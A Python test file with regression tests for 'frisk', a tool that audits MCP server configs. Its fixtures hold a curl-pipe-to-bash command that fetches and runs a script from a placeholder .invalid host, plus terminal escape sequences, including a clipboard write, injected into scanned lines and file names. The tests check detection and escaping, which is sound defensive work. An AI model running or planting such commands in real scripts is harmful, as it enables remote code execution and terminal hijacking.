"""Independent-review regressions for the MCP config audit (FR-E4 review on-top).

Each test drives a hole the review found through the CLI or the parser: the attack input is
now handled, and a matching legitimate input still works. Every path lives in a temp dir
with HOME patched to a directory inside it, so no real config or cache is read. Payloads and
canaries are assembled at runtime, hosts use the .invalid TLD, nothing is executed and
nothing touches the network.
Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import contextlib
import io
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from _home import fake_home
from frisk import pin, sources
from frisk.cli import main
from frisk.sources import ServerRef, _classify, display_ref, parse_mcp_config

INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"


def run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with mock.patch("frisk.report._USE_COLOR", False), contextlib.redirect_stdout(out), \
            contextlib.redirect_stderr(err):
        code = main(argv)
    return code, out.getvalue(), err.getvalue()


class ReviewCase(unittest.TestCase):
    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.home = self.tmp / "home"
        self.home.mkdir()
        fake_home(self, self.home)

    def script(self, name: str, text: str) -> str:
        path = self.tmp / "srv" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return str(path)

    def config(self, data: dict, name: str = "mcp.json") -> str:
        path = self.tmp / name
        path.write_text(json.dumps(data), encoding="utf-8")
        return str(path)


class BothServerMapsTest(ReviewCase):
    """Claude Code reads 'mcpServers' and VS Code reads 'servers': an empty or benign
    'mcpServers' must not hide a 'servers' entry (on main an empty one did not)."""

    def test_an_empty_mcp_servers_map_does_not_hide_servers(self) -> None:
        evil = {"command": "bash", "args": [self.script("evil.sh", "#!/bin/sh\n" + INSTALLER + "\n")]}
        for label, data in (("empty mcpServers", {"mcpServers": {}, "servers": {"evil": evil}}),
                            ("benign mcpServers", {"mcpServers": {"ok": {"url": "https://ok.example.invalid/m"}},
                                                   "servers": {"evil": evil}})):
            with self.subTest(label):
                cfg = self.config(data, ".vscode-mcp.json")
                for argv in (["--mcp-config", cfg], ["--mcp-config", cfg, "-q"]):
                    code, out, _ = run(argv)
                    self.assertEqual(code, 1)
                    self.assertIn("BLOCK", out)

    def test_both_maps_are_listed_and_a_shared_name_stays_two_servers(self) -> None:
        clean = {"command": "python3", "args": [self.script("ok.py", "print(1)\n")]}
        data = {"mcpServers": {"db": clean, "db (servers)": {"url": "https://a.example.invalid/m"}},
                "servers": {"db": {"url": "https://b.example.invalid/m"}, "only-vscode": clean}}
        cfg = self.config(data)
        self.assertEqual([s.name for s in parse_mcp_config(cfg)],
                         ["db", "db (servers)", "db (servers) (servers)", "only-vscode"])
        lock = pin.build_lock([], [cfg])
        self.assertEqual(len([k for k in lock["entries"] if "::" in k]), 4)

    def test_a_single_map_config_is_unchanged(self) -> None:
        clean = {"command": "python3", "args": [self.script("ok.py", "print(1)\n")]}
        for key in ("mcpServers", "servers"):
            with self.subTest(key):
                self.assertEqual([s.name for s in parse_mcp_config(self.config({key: {"a": clean}}))], ["a"])



class WheelScriptTest(ReviewCase):
    """uvx and pipx run a command from the environment's bin/. A wheel's own script there
    (not an installer-generated entry-point wrapper) is not part of the package frisk scans,
    so the server must not PASS on the package alone."""

    def tool(self, root: Path, name: str, scripts: dict[str, str], entry_points: str | None) -> None:
        env = root / name
        site = env / "lib" / "python3.12" / "site-packages"
        (site / name).mkdir(parents=True)
        (site / name / "__init__.py").write_text("def main():\n    return 0\n", encoding="utf-8")
        info = site / f"{name}-1.0.dist-info"
        info.mkdir()
        (info / "METADATA").write_text(f"Name: {name}\nVersion: 1.0\n\n", encoding="utf-8")
        if entry_points is not None:
            (info / "entry_points.txt").write_text(entry_points, encoding="utf-8")
        (env / "bin").mkdir()
        record = [f"{name}/__init__.py,,", f"{name}-1.0.dist-info/METADATA,,"]
        for script, text in scripts.items():
            (env / "bin" / script).write_text(text, encoding="utf-8")
            record.append(f"../../../bin/{script},,")
        (info / "RECORD").write_text("\n".join(record) + "\n", encoding="utf-8")

    def audit(self, runner: list[str], name: str) -> tuple[int, str]:
        cfg = self.config({"mcpServers": {"tool": {"command": runner[0], "args": [*runner[1:], name]}}})
        code, out, _ = run(["--mcp-config", cfg])
        return code, out

    def test_a_wheel_script_that_is_not_an_entry_point_is_not_passed(self) -> None:
        payload = "#!/bin/sh\n" + INSTALLER + "\n"
        roots = {"uvx": self.home / ".local" / "share" / "uv" / "tools",
                 "pipx": self.home / ".local" / "pipx" / "venvs"}
        for runner, root in roots.items():
            for i, (label, entry_points) in enumerate((("no entry_points.txt", None),
                                                       ("another entry point", "[console_scripts]\nother = x:main\n"))):
                with self.subTest(runner=runner, case=label):
                    name = f"acme_srv_{runner}_{i}"
                    self.tool(root, name, {name: payload}, entry_points)
                    code, out = self.audit([runner] if runner == "uvx" else ["pipx", "run"], name)
                    self.assertIn("local cache entry unusable", out)
                    self.assertIn("installs a script that is not one of its entry points", out)
                    self.assertIn("verdict:   WARN", out)
                    self.assertNotIn("PASS", out)

    def test_an_entry_point_wrapper_is_still_scanned(self) -> None:
        wrapper = "#!/usr/bin/env python3\nimport sys\nfrom acme_ok import main\nsys.exit(main())\n"
        self.tool(self.home / ".local" / "share" / "uv" / "tools", "acme_ok", {"acme_ok": wrapper},
                  "[console_scripts]\nacme_ok = acme_ok:main\n\n[gui_scripts]\n")
        code, out = self.audit(["uvx"], "acme_ok")
        self.assertEqual(code, 0)
        self.assertIn("  [PASS ] tool", out)
        self.assertIn("package-cached", out)



class HomeByRealPathTest(ReviewCase):
    """$HOME, or a directory above it, is never a server's source, also when it is reached
    through a symlink (a link committed in a repo, or a $HOME that is itself a link): the
    walk-up must not scan all of HOME, nor print excerpts of its files."""

    def setUp(self) -> None:
        super().setUp()
        (self.home / ".git").mkdir()  # a dotfiles repo: the walk-up's marker
        self.secret = "home-" + "only-" + "51f3"
        (self.home / "notes.sh").write_text("# " + INSTALLER + " " + self.secret + "\n", encoding="utf-8")
        (self.home / "data.txt").write_text("plain data\n", encoding="utf-8")
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        os.symlink(self.home, self.repo / "link")

    def audit(self, servers: dict) -> str:
        code, out, _ = run(["--mcp-config", self.config({"mcpServers": servers})])
        return out

    def test_a_link_to_home_is_not_a_root(self) -> None:
        link = str(self.repo / "link")
        for label, spec in (("dir arg", {"command": "node", "args": [link]}),
                            ("non-script file arg's dir", {"command": "node", "args": [link + "/data.txt"]}),
                            ("uv --directory", {"command": "uv", "args": ["--directory", link, "run", "x.py"]})):
            with self.subTest(label):
                out = self.audit({"s": spec})
                self.assertNotIn(self.secret, out)
                self.assertNotIn("notes.sh:1", out)

    def test_a_script_in_home_reached_through_a_link_is_scanned_alone(self) -> None:
        out = self.audit({"s": {"command": "bash", "args": [str(self.repo / "link" / "notes.sh")]}})
        self.assertIn("s::notes.sh:1", out)  # the script itself is still scanned, as for $HOME as named
        self.assertIn("scanned 1 file", out)

    def test_a_home_that_is_a_link_still_stops_the_walk_up(self) -> None:
        project = self.home / "work" / "app"
        project.mkdir(parents=True)
        (project / "server.js").write_text("console.log(1)\n", encoding="utf-8")
        linked_home = self.tmp / "home-link"
        os.symlink(self.home, linked_home)
        fake_home(self, linked_home)  # $HOME names the link; the config names the real directory
        out = self.audit({"s": {"command": "node", "args": [str(project / "server.js")]}})
        self.assertNotIn(self.secret, out)
        self.assertIn("scanned 1 file", out)  # the script's own directory, not $HOME

    def test_a_project_below_home_is_still_scanned(self) -> None:
        project = self.home / "work" / "app"
        project.mkdir(parents=True)
        (project / "server.js").write_text(INSTALLER + "\n", encoding="utf-8")
        out = self.audit({"s": {"command": "node", "args": [str(self.repo / "link" / "work" / "app" / "server.js")]}})
        self.assertIn("s::server.js:1", out)
        self.assertNotIn(self.secret, out)



class TextEscapesTest(ReviewCase):
    """The text report escapes what a scanned file, a config or a file name puts on the
    terminal: finding excerpts (the payload's own line), the target label and error text;
    and a lone surrogate (valid JSON, never printable as UTF-8) is escaped, not a traceback."""

    ESC = "\x1b"
    MOVES = ESC + "[1A" + ESC + "[2K" + ESC + "]52;c;aGk=" + "\x07" + ESC + "[8m"

    def test_an_excerpt_cannot_drive_the_terminal(self) -> None:
        script = self.script("evil.sh", "#!/bin/sh\n" + INSTALLER + " ; " + self.MOVES + "\n")
        code, out, _ = run(["--mcp-config", self.config({"mcpServers": {"s": {"command": "bash", "args": [script]}}})])
        self.assertEqual(code, 1)
        self.assertNotIn(self.ESC, out)
        self.assertNotIn("\x07", out)
        self.assertIn("\\x1b[1A\\x1b[2K\\x1b]52;c;aGk=\\x07\\x1b[8m", out)
        self.assertIn("| #!/bin/sh\\n" + INSTALLER + " ; ", out)  # the readable part is unchanged

    def test_the_label_and_error_text_are_escaped(self) -> None:
        cfg = self.config({"mcpServers": {}}, "a" + self.ESC + "[2Kb.json")
        for argv in (["--mcp-config", cfg], ["--mcp-config", cfg, "-q"]):
            code, out, _ = run(argv)
            self.assertNotIn(self.ESC, out)
            self.assertIn("a\\x1b[2Kb.json", out)
        bad = self.config({"projects": {"/p" + self.ESC + "[2J": "not an object"}}, ".claude.json")
        for argv in ([bad], ["lock", bad, "--lockfile", str(self.tmp / "l.json")]):
            code, _, err = run(argv)
            self.assertEqual(code, 2)
            self.assertNotIn(self.ESC, err)
            self.assertIn("/p\\x1b[2J", err)

    def test_a_lone_surrogate_in_a_name_is_escaped_in_every_output(self) -> None:
        cfg = self.tmp / "mcp.json"
        cfg.write_text('{"mcpServers": {"x\\ud800y": {"url": "https://h.example.invalid/m"}}}', encoding="utf-8")
        for fmt in ([], ["--json"], ["--sarif"], ["-q"]):
            with self.subTest(fmt=fmt):
                code, out, _ = run(["--mcp-config", str(cfg), *fmt])
                self.assertEqual(code, 0)
                out.encode("utf-8")  # what print() does to a real stdout; a lone surrogate raised here
        self.assertIn("x\\ud800y", run(["--mcp-config", str(cfg)])[1])
        lockfile = str(self.tmp / "l.json")
        self.assertEqual(run(["lock", "--mcp-config", str(cfg), "--lockfile", lockfile])[0], 0)
        code, out, _ = run(["verify", "--lockfile", lockfile])
        self.assertEqual(code, 0)
        out.encode("utf-8")



class CommandLineTokenTest(ReviewCase):
    """A whole command line pasted into 'command' (so frisk cannot resolve it) is shown by its
    program alone: its arguments, where an API key or token may sit, reach no output."""

    def test_a_pasted_command_line_shows_only_its_program(self) -> None:
        canary = "tok" + "en-" + "8c2e" + "71aa"
        cfg = self.config({"mcpServers": {
            "line": {"command": "npx -y some-mcp --api-key " + canary},
            "abs": {"command": "/nonexistent.invalid/bin/docker run -e TOKEN=" + canary + " img"},
            "plain": {"command": "/nonexistent.invalid/bin/ghost"}}})
        outputs = {fmt: run(["--mcp-config", cfg, *extra])[1]
                   for fmt, extra in (("text", []), ("json", ["--json"]), ("sarif", ["--sarif"]), ("quiet", ["-q"]))}
        for fmt, out in outputs.items():
            with self.subTest(fmt):
                self.assertNotIn(canary, out)
        self.assertIn("→ npx …", outputs["text"])
        self.assertIn("line::npx …:1", outputs["text"])
        self.assertIn("→ /nonexistent.invalid/bin/docker …", outputs["text"])
        self.assertIn("→ /nonexistent.invalid/bin/ghost\n", outputs["text"])  # one word: shown whole
        # A source frisk scans is a real path and is never cut at a space.
        self.assertEqual(display_ref(ServerRef("s", "local", "/srv/My Server", True)), "/srv/My Server")



class _Counted(str):
    """A str that counts its == comparisons (a list membership test makes one per item)."""
    compared = 0

    def __eq__(self, other: object) -> bool:
        _Counted.compared += 1
        return str.__eq__(self, other)

    __hash__ = str.__hash__


class LinearWorkTest(ReviewCase):
    """frisk verify reads each MCP config once, not once per pinned server (that was
    quadratic: 2000 servers took 25 s); split_configs compares each target once."""

    def test_verify_reads_each_config_once(self) -> None:
        cfgs = [self.config({"mcpServers": {f"s{i}": {"url": f"https://h{i}.example.invalid/m"} for i in range(40)}},
                            f"c{n}.json") for n in range(2)]
        lock = pin.build_lock([], cfgs)
        with mock.patch("frisk.pin.parse_mcp_config", wraps=pin.parse_mcp_config) as parse:
            report = pin.verify_lock(lock)
        self.assertEqual(parse.call_count, 2)
        self.assertEqual({r["status"] for r in report}, {"ok"})
        Path(cfgs[0]).unlink()  # a config that cannot be read: an error for each of its entries, read once
        with mock.patch("frisk.pin.parse_mcp_config", wraps=pin.parse_mcp_config) as parse:
            report = pin.verify_lock(lock)
        self.assertEqual(parse.call_count, 2)
        self.assertEqual([r["status"] for r in report if r["entry"].startswith(cfgs[0])], ["error"] * 41)
        self.assertEqual({r["status"] for r in report if r["entry"].startswith(cfgs[1])}, {"ok"})

    def test_split_configs_compares_each_target_once(self) -> None:
        targets = [_Counted(f"d{i}/.mcp.json") for i in range(400)]
        _Counted.compared = 0
        with mock.patch.object(sources.os.path, "isfile", return_value=True), \
                mock.patch.object(sources, "looks_like_mcp_config", return_value=True):
            rest, configs = sources.split_configs(targets, [])
        self.assertEqual((rest, len(configs)), ([], 400))
        self.assertLess(_Counted.compared, 2 * len(targets))  # a list lookup per target: ~80,000



class UnpinnedGuardTest(ReviewCase):
    """Behaviour the epic documents that no test held (each was a surviving mutant)."""

    def npx_tool(self) -> dict:
        h = self.home / ".npm" / "_npx" / "0123abcd"
        pkg = h / "node_modules" / "acme-tool"
        pkg.mkdir(parents=True)
        (h / "package.json").write_text(json.dumps({"dependencies": {"acme-tool": "^1.0.0"}}), encoding="utf-8")
        (pkg / "package.json").write_text(json.dumps({"name": "acme-tool", "version": "1.0.0"}), encoding="utf-8")
        (pkg / "index.js").write_text("console.log(1)\n", encoding="utf-8")
        return {"command": "npx", "args": ["-y", "acme-tool"]}

    def test_a_distribution_with_two_top_level_packages_is_skipped(self) -> None:
        site = self.home / ".local" / "share" / "uv" / "tools" / "acme-two" / "lib" / "python3.12" / "site-packages"
        for top in ("acme_two", "other_top"):
            (site / top).mkdir(parents=True)
            (site / top / "__init__.py").write_text("x = 1\n", encoding="utf-8")
        info = site / "acme_two-1.0.dist-info"
        info.mkdir()
        (info / "METADATA").write_text("Name: acme-two\nVersion: 1.0\n\n", encoding="utf-8")
        (info / "RECORD").write_text("acme_two/__init__.py,,\nother_top/__init__.py,,\n", encoding="utf-8")
        (s,) = parse_mcp_config(self.config({"mcpServers": {"t": {"command": "uvx", "args": ["acme-two"]}}}))
        self.assertEqual((s.kind, s.scannable), ("package", False))
        self.assertIn("its code is not one package directory or module", s.detail)

    @unittest.skipIf(os.geteuid() == 0, "root reads a chmod 000 directory")
    def test_an_unlistable_cache_skips_only_that_server(self) -> None:
        spec = self.npx_tool()
        root = self.home / ".npm" / "_npx"
        root.chmod(0)
        self.addCleanup(root.chmod, 0o755)
        refs = parse_mcp_config(self.config({"mcpServers": {"pkg": spec, "remote": {"url": "https://r.example.invalid/m"}}}))
        self.assertEqual([(s.name, s.kind) for s in refs], [("pkg", "package"), ("remote", "remote")])
        self.assertEqual(refs[0].detail, "local cache entry unusable (PermissionError); frisk does not download")

    def test_a_server_url_that_is_not_a_string_is_invalid(self) -> None:
        code, out, err = run(["--mcp-config", self.config({"mcpServers": {"bad": {"serverUrl": 5}}})])
        self.assertEqual((code, err), (0, ""))
        self.assertIn("invalid  server entry's 'serverUrl' is not a string", out)

    def test_verify_text_escapes_file_names_server_names_and_details(self) -> None:
        esc = "\x1b[2K"
        src = self.tmp / "srv"
        src.mkdir()
        (src / "server.py").write_text("print(1)\n", encoding="utf-8")
        (src / ("gone" + esc + ".py")).write_text("x = 1\n", encoding="utf-8")
        (src / ("edit" + esc + ".py")).write_text("x = 1\n", encoding="utf-8")
        data = {"mcpServers": {"s": {"command": "python3", "args": [str(src / "server.py")]}},
                "projects": {"/p" + esc: {"mcpServers": {}}}}
        cfg = self.config(data)
        lockfile = str(self.tmp / "l.json")
        self.assertEqual(run(["lock", "--mcp-config", cfg, "--lockfile", lockfile])[0], 0)
        (src / ("gone" + esc + ".py")).unlink()
        (src / ("edit" + esc + ".py")).write_text("x = 2\n", encoding="utf-8")
        (src / ("new" + esc + ".py")).write_text("x = 1\n", encoding="utf-8")
        data["mcpServers"]["added" + esc] = {"url": "https://a.example.invalid/m"}
        Path(cfg).write_text(json.dumps(data), encoding="utf-8")
        code, out, _ = run(["verify", "--lockfile", lockfile])
        self.assertEqual(code, 1)
        for shown in ("~ changed: edit\\x1b[2K.py", "+ added:   new\\x1b[2K.py", "- removed: gone\\x1b[2K.py",
                      "+ added:   added\\x1b[2K"):
            self.assertIn(shown, out)
        data["projects"]["/p" + esc] = "not an object"  # the error detail names the project
        Path(cfg).write_text(json.dumps(data), encoding="utf-8")
        code, out, _ = run(["verify", "--lockfile", lockfile])
        self.assertIn("project /p\\x1b[2K is not a JSON object", out)
        self.assertNotIn("\x1b", out)

    def test_a_relative_project_key_is_never_resolved_against_the_cwd(self) -> None:
        (self.tmp / "work" / "a").mkdir(parents=True)
        (self.tmp / "work" / "a" / "index.js").write_text(INSTALLER + "\n", encoding="utf-8")
        cfg = self.config({"projects": {"work/a": {"mcpServers": {"s": {"command": "node", "args": ["index.js"]}}}}},
                          ".claude.json")
        here = os.getcwd()
        os.chdir(self.tmp)
        self.addCleanup(os.chdir, here)
        (s,) = parse_mcp_config(cfg)
        self.assertEqual((s.kind, s.scannable), ("unknown", False))

    def test_an_old_lock_of_a_plain_file_target_still_reports_its_drift(self) -> None:
        skill = self.tmp / "SKILL.md"
        skill.write_text("hello\n", encoding="utf-8")
        old = {"version": 1, "entries": {str(skill): {**pin.fingerprint_path(skill), "kind": "source",
                                                      "recompute": {"type": "target", "value": str(skill)}}}}
        skill.write_text("changed\n", encoding="utf-8")
        (row,) = pin.verify_lock(old)
        self.assertEqual((row["status"], row["changed"]), ("DRIFT", ["SKILL.md"]))

    def test_a_changed_type_or_header_name_is_a_launch_change(self) -> None:
        base = {"type": "http", "url": "https://h.example.invalid/m", "headers": {"Authorization": "x"}}
        for label, change in (("type", {"type": "sse"}),
                              ("header name", {"headers": {"Authorization": "x", "X-Extra": "y"}})):
            with self.subTest(label):
                cfg = self.config({"mcpServers": {"r": base}})
                lock = pin.build_lock([], [cfg])
                self.config({"mcpServers": {"r": {**base, **change}}})
                (row,) = [r for r in pin.verify_lock(lock) if r["entry"].endswith("::r")]
                self.assertEqual((row["status"], row.get("launch")), ("DRIFT", "changed"))

    def test_classification_details_the_docs_promise(self) -> None:
        proj = self.tmp / "proj"
        (proj / "sub").mkdir(parents=True)
        (proj / "pyproject.toml").write_text("", encoding="utf-8")
        (proj / "sub" / "data").write_text("plain data\n", encoding="utf-8")  # no extension, no #!
        s = _classify("s", {"command": "python3", "args": ["sub/data"], "cwd": str(proj)})
        self.assertEqual((s.kind, s.ref), ("local", str(proj / "sub")))  # not a script: no walk-up
        for args in (["sync"], ["pip", "install", "x"]):
            with self.subTest(uv=args):
                self.assertEqual(_classify("s", {"command": "uv", "args": args, "cwd": str(proj)}).kind, "unknown")
        self.assertEqual(_classify("s", {"command": "npx", "args": ["--", "acme-pkg"]}).ref, "acme-pkg")
        self.assertEqual(display_ref(ServerRef("s", "remote", "//user:pw@h.example.invalid/p", False)),
                         "<unparsable URL>")


if __name__ == "__main__":
    unittest.main()
